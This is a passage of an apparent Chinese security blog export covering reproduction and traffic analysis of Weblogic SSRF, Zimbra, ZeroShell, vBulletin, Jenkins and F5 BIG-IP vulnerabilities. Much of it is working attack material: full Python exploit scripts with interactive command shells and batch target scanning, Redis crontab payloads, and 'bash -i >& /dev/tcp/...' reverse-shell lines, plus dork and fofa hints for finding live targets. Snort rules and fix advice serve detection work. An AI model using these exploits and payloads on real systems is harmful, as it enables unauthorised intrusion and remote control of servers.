漏洞地址在/uddiexplorer/SearchPublicRegistries.jsp，抓包后可以在请求包里发现operator参数值为URL。 将operator参数值改为其他url，再次发包测试。 可以很明显的看到靶机对我们修改后的URL进行了访问.修改端口后，访问不存在的地址，靶机返回信息提示连接不到服务。所以存在ssrf漏洞 环境搭建编译及启动测试环境 1docker-compose up -d 访问http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用。 SSRF漏洞复现SSRF漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如http://127.0.0.1:80： 12345678GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close 可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。 修改为一个不存在的端口，将会返回could not connect over HTTP to server。 通过redis服务反弹shellWeblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 查看ip redis的服务，是另外开启的docker.通过靶场服务器，查看一下redis的ip。（也可以通过爆破进行，通过ssrf探测内网中的redis服务器，docker环境网段一般是172.*）开启服务的端口，探测成功后的显示是页面报错码 redis默认端口6379.检测一下，是否开放。返回了did not have a valid SOAP content-type 确实开放 etc/crontab文件：设置定时任务。用于设置周期性被执行的指令。 可进行利用的cron有如下几个地方： &#x2F;etc&#x2F;crontab 这个是肯定的 &#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件 发送三条redis命令，将反弹shell脚本写入/etc/crontab： 12345set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;监听ip&gt;/7777 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsaveaaa 进行url编码： 1set%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3C%E7%9B%91%E5%90%ACip%3E%2F7777%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 注意，换行符是“\\r\\n”，也就是“%0D%0A”。 将url编码后的字符串放在ssrf的域名后面，发送： 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.19.0.2:6379/test%0D%0A%0D%0A&lt;payload&gt; 流量分析根据利用链，可以看出来，问题出在/uddiexplorer/SearchPublicRegistries.jsp。可以对这条路径进行访问限制和过滤。流量分析时，可以以这个为突破点。 另外反弹shell的时候，会有特征关键字crontab /dev/tcp/ crontab /dev/tcp/ 提取的规则字段为：http_client_body ，提取的时候，这个关键字可以用hex来提取。 修复建议 修复的直接方法是将SearchPublicRegistries.jsp直接删除； 删除uddiexplorer文件夹，限制uddiexplorer应用只能内网访问","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"}],"author":"Gryffinbit"},{"title":"Zimbra RCE漏洞复现及流量分析(CVE-2019-9621)","slug":"Zimbra-RCE漏洞复现及流量分析-CVE-2019-9621","date":"2022-11-16T15:38:53.000Z","updated":"2024-11-12T06:58:57.000Z","comments":true,"path":"2022/11/16/Zimbra-RCE漏洞复现及流量分析-CVE-2019-9621/","permalink":"https://gryffinbit.top/2022/11/16/Zimbra-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-9621/","excerpt":"","text":"漏洞简介简介 当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken 后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。 漏洞影响 ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说： Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。 Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。 复现环境安装 https://www.jianshu.com/p/722bc70ff426 参考文章https://www.jianshu.com/p/722bc70ff426","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Zimbra","slug":"Zimbra","permalink":"https://gryffinbit.top/tags/Zimbra/"}],"author":"Gryffinbit"},{"title":"ZeroShell 命令注入漏洞复现及流量分析(CVE-2019-12725)","slug":"ZeroShell-命令注入漏洞复现及流量分析-CVE-2019-12725","date":"2022-11-16T11:06:58.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/16/ZeroShell-命令注入漏洞复现及流量分析-CVE-2019-12725/","permalink":"https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/","excerpt":"","text":"漏洞详情Zeroshell 是一个微型的linux发行版本，它功能强大，具有强大的router、radius、web门户、防火墙、virtual、Qos、 DHCP、dns转发等功能，可以用来安装到服务器上为内网提供网络服务，而且安装和使用都很方便，有U盘，Live CD和Flash imgage文件用于安装，可以使用web界面进行设置和管理。想自己部署软路由，又不想编译，找驱动程序，或者别人编译的固件有后门，可以考虑用Zeroshell替代Openwrt&#x2F;LEDE。 总的来说Zeroshell的特性包括： 负载均衡及多网络连接的失效转移，通过3G调制解调器的UMTS&#x2F;HSDPA连接 用于提供安全认证和无线网络加密密钥自动管理的RADIUS服务器 用于支持网页登录的强制网络门户（商场和酒店等商用场景） 影响版本 ZeroShell &lt; 3.9.0 验证POC 12/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&lt;cmd&gt;%0A%27 复现fofa搜索，找到网络中该设备 exp python3 CVE-2019-12725.py -u http://127.0.0.1:1111 单个url测试 python3 CVE-2019-12725.py -c http://127.0.0.1:1111 cmdshell模式 python3 CVE-2019-12725.py -f url.txt 批量检测 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127import requestsimport reimport sysimport urllib3from argparse import ArgumentParserimport threadpoolfrom urllib import parsefrom time import timeimport randomurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)filename = sys.argv[1]url_list=[]#随机uadef get_ua(): first_num = random.randint(55, 62) third_num = random.randint(0, 3200) fourth_num = random.randint(0, 140) os_type = [ &#x27;(Windows NT 6.1; WOW64)&#x27;, &#x27;(Windows NT 10.0; WOW64)&#x27;, &#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27; ] chrome_version = &#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;.format(first_num, third_num, fourth_num) ua = &#x27; &#x27;.join([&#x27;Mozilla/5.0&#x27;, random.choice(os_type), &#x27;AppleWebKit/537.36&#x27;, &#x27;(KHTML, like Gecko)&#x27;, chrome_version, &#x27;Safari/537.36&#x27;] ) return uadef check_vuln(url): url = parse.urlparse(url) url2=url.scheme + &#x27;://&#x27; + url.netloc headers = &#123; &#x27;User-Agent&#x27;: get_ua(), &#125; # data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;) try: res2 = requests.get(url2 + &#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;,headers=headers,timeout=10,verify=False) if res2.status_code==200 and &quot;uid&quot; in res2.text: print(&quot;\\033[32m[+]%s is vuln\\033[0m&quot; %url2) return 1 else: print(&quot;\\033[31m[-]%s is not vuln\\033[0m&quot; %url1) except Exception as e: print(&quot;\\033[31m[-]%s is timeout\\033[0m&quot; %url2)#cmdshelldef cmdshell(url): if check_vuln(url)==1: url = parse.urlparse(url) url1 = url.scheme + &#x27;://&#x27; + url.netloc + &#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27; while 1: shell = input(&quot;\\033[35mcmd: \\033[0m&quot;) if shell ==&quot;exit&quot;: sys.exit(0) else: headers = &#123; &#x27;User-Agent&#x27;: get_ua(), &#125; try: res = requests.get(url1 + shell + &#x27;%0A%27&#x27;,headers=headers,timeout=10,verify=False) if res.status_code==200 and len(res.text) != 0: vulntext=res.text.split(&#x27;&lt;html&gt;&#x27;) print(&quot;\\033[32m%s\\033[0m&quot; %vulntext[0]) else: print(&quot;\\033[31m[-]%s Command execution failed !\\033[0m&quot; %url1) except Exception as e: print(&quot;\\033[31m[-]%s is timeout!\\033[0m&quot; %url1)#多线程def multithreading(url_list, pools=5): works = [] for i in url_list: # works.append((func_params, None)) works.append(i) # print(works) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(check_vuln, works) [pool.putRequest(req) for req in reqs] pool.wait()if __name__ == &#x27;__main__&#x27;: show = r&#x27;&#x27;&#x27; _____ _ _ _____ _____ _____ __ _____ __ _____ ___________ _____ / __ \\ | | | ___| / __ \\| _ |/ | | _ | / | / __ \\|___ / __ \\| ___| | / \\/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27; / /`&#x27; / /&#x27;|___ \\ | | | | | | __|______| / / | /| | | | \\____ |______|| | / / / / / / \\ \\ | \\__/\\ \\_/ / |___ ./ /___\\ |_/ /_| |_.___/ / _| |_./ /___./ / ./ /___/\\__/ / \\____/\\___/\\____/ \\_____/ \\___/ \\___/\\____/ \\___/\\_____/\\_/ \\_____/\\____/ CVE-2019-12725 By m2 &#x27;&#x27;&#x27; print(show + &#x27;\\n&#x27;) arg=ArgumentParser(description=&#x27;CVE-2019-12725 By m2&#x27;) arg.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;Target URL; Example:http://ip:port&quot;) arg.add_argument(&quot;-f&quot;, &quot;--file&quot;, help=&quot;Target URL; Example:url.txt&quot;) arg.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Target URL; Example:http://ip:port&quot;) args=arg.parse_args() url=args.url filename=args.file cmd=args.cmd print(&#x27;[*]任务开始...&#x27;) if url != None and cmd == None and filename == None: check_vuln(url) elif url == None and cmd == None and filename != None: start=time() for i in open(filename): i=i.replace(&#x27;\\n&#x27;,&#x27;&#x27;) check_vuln(i) end=time() print(&#x27;任务完成，用时%d&#x27; %(end-start)) elif url == None and cmd != None and filename == None: cmdshell(cmd) 流量分析由于是https协议，wireshark抓包后都是加密流量，需要对流量进行解密。 原理SSL&#x2F;TLS的整个握手过程： Clienthello：发送客户端的功能和首选项给服务器，在连接建立后，当希望重协商、或者响应服务器的重协商请求时会发送。 version：客户端支持的最佳协议版本 Random：共32字节，28字节随机数，4字节额外信息，受客户端时钟影响（为了避免浏览器指纹采集，现在一般会对4字节时钟做扭曲） Session ID：32字节随机数，用于和服务器重建会话，为空表示新建会话 cipher suit：客户端支持的所有密码套件，按优先级排列 Compression：客户端支持的压缩算法，默认无压缩 Extensions：由任意数量的扩展组成，携带额外数据 ServerHello： 选择客户端提供的参数反馈客户端 服务器无需支持客户端支持的最佳版本，如果服务器不支持客户端版本，可以提供其他版本以期待客户端可以接受 Certificate： 用于携带服务器X.509证书链 主证书必须第一个发送，中间证书按照正确的顺序跟在主证书之后 服务器必须保证发送的证书和选择的算法套件一致 Certificate消息时可选的 ServerKeyExchange: 携带密钥交换的额外数据，取决于加密套件 ServerHelloDone：服务器已将所有预计的握手消息发送完毕 ClientkeyExchange：携带客户端为密钥交换提供的信息 ChangeCipherSpec：发送端已取得用以连接参数的足够的信息 Finish：握手完成，消息内容加密，双方可以交换验证，整个握手完整性所需的数据 算法：verrify_data &#x3D; PRF(master_secret , finished_label,hash(handshake_message)) 破解方式 要解密HTTPS流量，需要得到加密密钥，加密密钥由主密钥、客户端随机数、服务器随机数生成。由上述握手过程可知，客户端随机数和服务器随机数在双方握手消息中传递，而主密钥（master_secret）则由预主密钥（pre_master_secret）结合两个随机数生成。预主密钥通过密码套件中的密钥交换算法进行交换（DH、RSA）。 因此，通过Wireshark解密HTTPS，可以从两个地方下手： 密钥交换算法选择RSA，然后提取服务器的私钥，将私钥导入Wireshark，通过Wireshark解密密钥交换过程中传递的预主密钥，再结合之前的客户端和服务器随机数生成主密钥，进一步生成加密密钥，即可解密后续抓取到的加密报文。 直接从客户端提取预主密钥，结合客户端和服务器随机数生成加密密钥，实现对加密报文的解密。 方法一 方法二 1234567mkdir ~/tls &amp;&amp; touch ~/tls/sslkeylog.log#zshecho &quot;\\nexport SSLKEYLOGFILE=~/tls/sslkeylog.log&quot; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc#bashecho &quot;\\nexport SSLKEYLOGFILE=~/tls/sslkeylog.log&quot; &gt;&gt; ~/.bash_profile &amp;&amp; . ~/.bash_profile 让Wireshark读取密钥文件 在 Wireshark 的 SSL 配置面板的 「(Pre)-Master-Secret log filename」选项中这个文件选上（编辑-&gt;&#x3D;首选项-&gt;协议）。如下图 注意，这是老版本的wireshark，如果发现没有SSL选项，则选择TLS，新版本的是TLS；但是配置是一样的； 「SSL debug file」也建议配上，这样解密过程中的日志都会记录下来，便于调试。 新版 Wireshark 在配置了 TLS 加密后，会自动识别并解析 HTTPS 流量。访问想要抓包的 HTTPS 网站，根据 IP 和协议过滤一下，就可以轻松看到想要的 HTTPS 数据包了。 配置好密钥之后，重新抓取。 解密成功follow http 参考文章https://github.com/MzzdToT/CVE-2019-12725 https://www.csdn.net/tags/MtTaMg1sMzE3MzU3LWJsb2cO0O0O.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"ZeroShell","slug":"ZeroShell","permalink":"https://gryffinbit.top/tags/ZeroShell/"}],"author":"Gryffinbit"},{"title":"vBulletin 5.x RCE（CVE-2019-16759）复现及流量分析","slug":"vBulletin-5-x-RCE（CVE-2019-16759）复现及流量分析","date":"2022-11-15T14:52:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/11/15/vBulletin-5-x-RCE（CVE-2019-16759）复现及流量分析/","permalink":"https://gryffinbit.top/2022/11/15/vBulletin-5-x-RCE%EF%BC%88CVE-2019-16759%EF%BC%89%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"漏洞原理前言 vBulletin是一个收费低廉但强大的建站BBS(论坛)CMS（内容管理系统，是一种位于web前端和后端之间的软件系统。发布人员使用内容管理系统提交、修改、发布内容等），该CMS国外大量论坛使用，中国国内少许网站使用。近日，vBulletin 5.x爆出一个前台远程代码执行漏洞,无需登录即可触发。该论坛程序在国外的国外的用户量就类似dz论坛在国内的用户量。 概述 漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。 影响范围 5.0.0 &lt;&#x3D; vBulletin &lt;&#x3D;5.5.4 漏洞修复 建议对includes\\vb5\\frontend\\controller\\bbcode.php中的变量evalCode做过滤防护 环境搭建vBulletion有在线测试版本 1https://www.vbulletin.com/en/vb5-trial/ 或者docker 复现 123456789101112131415docker run -ti -p 80:8080 --name vbulletin -d p8361/vbulletin-cve-2015-7808docker exec -it &lt;id&gt; /bin/bash# update然后装vimapt-get update# 改配置vi /etc/apache2/apache2.conf# 最下面补这个配置ServerName localhost:80# 给根目录下run.sh权限并启动chmod +x ./run.sh./run.sh 复现exp 远程代码执行漏洞的触发点是未经过验证的用户通过向index.php发送routestring参数，当routesting参数是ajax/render/widget_php，通过widgetConfig[code]执行远程代码，格式为echo shell_exec(&#39;&quot;+cmd+&quot;&#39;); exit; python2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit## This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - &quot;Powered by vBulletin Version 5.5.4&quot;import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = raw_input(&quot;vBulletin$ &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&#x27;&quot;+cmd+&quot;&#x27;); exit;&quot; r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot; Closing shell...&quot;) except Exception, e: sys.exit(str(e)) python3 用burp抓包 123456789101112131415161718192021222324252627# -*-coding:utf-8 -*-import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])proxies =&#123; &quot;http&quot;:&quot;http://127.0.0.1:8080/&quot;&#125;params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = input(&quot;&gt;&gt;&gt;Shell= &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&#x27;&quot;+cmd+&quot;&#x27;); exit;&quot; r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200: print(r.text) else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot;\\nClosing shell...&quot;) except Exception as e: sys.exit(str(e)) 特征流量 参考文章https://xz.aliyun.com/t/6495","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"jenkins远程命令执行漏洞特征分析及规则提取（CVE-2018-1000861）","slug":"jenkins远程命令执行漏洞（CVE-2018-1000861）","date":"2022-11-09T10:29:06.000Z","updated":"2024-11-12T06:59:35.000Z","comments":true,"path":"2022/11/09/jenkins远程命令执行漏洞（CVE-2018-1000861）/","permalink":"https://gryffinbit.top/2022/11/09/jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000861%EF%BC%89/","excerpt":"","text":"简介Jenkins是开源软件项目，基于Java开发的持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。 Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。 通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令 vulhub靶场复现腾讯云服务器 12docker-compose builddocker-compose up -d 访问靶场http://your-ip:8080 漏洞复现 - POC1234567http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x &#123; public x()&#123; &quot;touch /tmp/success&quot;.execute() &#125;&#125; Url编码 1public class x &#123;public x()&#123;&quot;touch /tmp/success&quot;.execute()&#125;&#125; 1/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20%7Bpublic%20x()%7B%22touch%20%2Ftmp%2Fsuccess%22.execute()%7D%7D 服务器验证，成功生成success文件 漏洞复现 - EXP.py使用方法： 12Usage: python exp.py &lt;url&gt; &lt;cmd&gt; 靶场端验证 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/python# coding: UTF-8# author: Orange Tsai(@orange_8361)# import sysimport requestsfrom enum import Enum# remove bad SSL warningstry: requests.packages.urllib3.disable_warnings()except: passendpoint = &#x27;descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#x27;class mode(Enum): ACL_PATCHED = 0 NOT_JENKINS = 1 READ_ENABLE = 2 READ_BYPASS = 3 ENTRY_NOTFOUND = 999def usage(): print &#x27;&#x27;&#x27; Usage: python exp.py &lt;url&gt; &lt;cmd&gt; &#x27;&#x27;&#x27;def _log(msg, fail=False): nb = &#x27;[*]&#x27; if fail: nb = &#x27;[-]&#x27; print &#x27;%s %s&#x27; % (nb, msg)def _get(url, params=None): r = requests.get(url, verify=False, params=params) return r.status_code, r.contentdef _add_bypass(url): return url + &#x27;securityRealm/user/admin/&#x27;def check(url): flag, accessible = mode.ACL_PATCHED, False # check ANONYMOUS_READ status, content = _get(url) if status == 200 and &#x27;adjuncts&#x27; in content: flag, accessible = mode.READ_ENABLE, True _log(&#x27;ANONYMOUS_READ enable!&#x27;) elif status == 403: _log(&#x27;ANONYMOUS_READ disable!&#x27;) # check ACL bypass, CVE-2018-1000861 status, content = _get(_add_bypass(url)) if status == 200 and &#x27;adjuncts&#x27; in content: flag, accessible = mode.READ_BYPASS, True else: flag = mode.NOT_JENKINS # check entry point, CVE-2019-1003005 if accessible: if flag is mode.READ_BYPASS: url = _add_bypass(url) status, content = _get(url + endpoint) if status == 404: flag = mode.ENTRY_NOTFOUND return flagdef exploit(url, cmd): payload = &#x27;public class x&#123;public x()&#123;new String(&quot;%s&quot;.decodeHex()).execute()&#125;&#125;&#x27; % cmd.encode(&#x27;hex&#x27;) params = &#123; &#x27;sandbox&#x27;: True, &#x27;value&#x27;: payload &#125; status, content = _get(url + endpoint, params) if status == 200: _log(&#x27;Exploit success!(it should be :P)&#x27;) elif status == 405: _log(&#x27;It seems Jenkins has patched the RCE gadget :(&#x27;) else: _log(&#x27;Exploit fail with HTTP status [%d]&#x27; % status, fail=True) if &#x27;stack trace&#x27; in content: for _ in content.splitlines(): if _.startswith(&#x27;Caused:&#x27;): _log(_, fail=True)if __name__ == &#x27;__main__&#x27;: if len(sys.argv) != 3: usage() exit() url = sys.argv[1].rstrip(&#x27;/&#x27;) + &#x27;/&#x27; cmd = sys.argv[2] flag = check(url) if flag is mode.ACL_PATCHED: _log(&#x27;It seems Jenkins is up-to-date(&gt;2.137) :(&#x27;, fail=True) elif flag is mode.NOT_JENKINS: _log(&#x27;Is this Jenkins?&#x27;, fail=True) elif flag is mode.READ_ENABLE: exploit(url, cmd) elif flag is mode.READ_BYPASS: _log(&#x27;Bypass with CVE-2018-1000861!&#x27;) exploit(_add_bypass(url), cmd) else: _log(&#x27;The `checkScript` is not found, please try other entries(see refs)&#x27;, fail=True) 反弹shellvps ip和端口 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 base编码 url编码 poc验证 1http://IP:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20&#123;public%20x()&#123;%22命令替换%22.execute()&#125;&#125; vps开启监听 1nc -lvnp 7777 抓包验证通过EXP，进行特征流量分析 1securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript 1descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript 规则提取（只提供提取思路） 除了最后一个地方可以不加，其他的字段分号后面都要加空格 1alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTTP_PORTS (msg:&quot;jenkins remote code execution(CVE-2018-1000861)&quot;; content:&quot;securityRealm/user/admin&quot;; fast_pattern:only; http_uri; reference:cve,2018-1000861;reference:url,https://access.redhat.com/security/cve/CVE-2018-1000861; classtype:attempted-admin; sid:1002523;rev:1;) 1234# 使用-A fast参数，在alert告警中，可以查看到告警内容和sidsnort -c /etc/snort/snort.conf -r jenkins.pcap -A fast -l /var/log/snort/# 查看告警日志cat /var/log/snort/alert 附件流量包以及exp 链接: https://pan.baidu.com/s/1fibahYkUQBkBiY9yc6s2hg","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"复现 BIG-IP iControl REST 漏洞（CVE-2022-1388）","slug":"复现 BIG-IP iControl REST 漏洞（CVE-2022-1388）","date":"2022-10-31T14:19:00.000Z","updated":"2024-11-12T07:00:17.000Z","comments":true,"path":"2022/10/31/复现 BIG-IP iControl REST 漏洞（CVE-2022-1388）/","permalink":"https://gryffinbit.top/2022/10/31/%E5%A4%8D%E7%8E%B0%20BIG-IP%20iControl%20REST%20%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1388%EF%BC%89/","excerpt":"","text":"漏洞详情漏洞简介 F5官网发布安全公告，披露F5 BIG-IP存在一处远程代码执行漏洞（CVE-2022-1388）。漏洞存在于iControl REST组件中，未经身份验证的攻击者可以发送请求绕过BIG-IP中的iControl REST认证，进而导致可以在目标主机上执行任意系统命令、创建或删除文件或禁用BIG-IP上的服务。 F5是负载均衡的老前辈，一直以来都以功能强大，性能稳定著称，很多功能其实是软负载无法做到的。 F5 BIG-IP用作HTTP负载均衡器的主要功能： 1、F5 BIG-IP提供12种灵活的算法将所有流量均衡的分配到各个服务器，而面对用户，只是一台虚拟服务器。 2、F5 BIG-IP可以确认应用程序能否对请求返回对应的数据。假如F5 BIG-IP后面的某一台服务器发生服务停止、死机等故障，F5会检查出来并将该服务器标识为宕机，从而不将用户的访问请求传送到该台发生故障的服务器上。这样，只要其它的服务器正常，用户的访问就不会受到影响。宕机一旦修复，F5 BIG-IP就会自动查证应用保证对客户的请求作出正确响应并恢复向该服务器传送。 3、F5 BIG-IP具有动态Session的会话保持功能，笔者也是在网站中使用的F5将用户IP与Session通过F5进行的绑定，使其Session保持一致。 4、F5 BIG-IP的iRules功能可以做HTTP内容过滤，根据不同的域名、URL，将访问请求传送到不同的服务器。 漏洞利用条件 该漏洞是由于iControl REST组件的身份验证功能存在缺陷，未经身份验证的恶意攻击者，可以通过构造特殊的恶意请求发送至BIG-IP服务器，从而能够绕过身份验证，在目标服务器上执行任意命令、创建或删除文件、禁用服务等。 漏洞影响范围 环境配置主机系统：MacBook Pro Big Sur 复现从官网https://downloads.f5.com/esd/productlines.jsp下载虚拟镜像，本地复现： 选择镜像需要在受影响版本内的虚拟机ova包 导入完成后打开该虚拟机，需要获取该虚拟机的ip，终端输入用户名root 密码 default登录后输入ifconfig mgmt即可查看ip（admin&#x2F;admin 也可以登陆） （密码Fuckyou123） 然后在浏览器输入https://&lt;ip&gt;打开看到登录界面抓包即可 流量是https加密的。 企业中有负载均衡，会把https解密成http，在进行检测 参考文章https://forum.butian.net/share/1567","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"复现WebSVN 2.6.0 操作系统命令注入漏洞 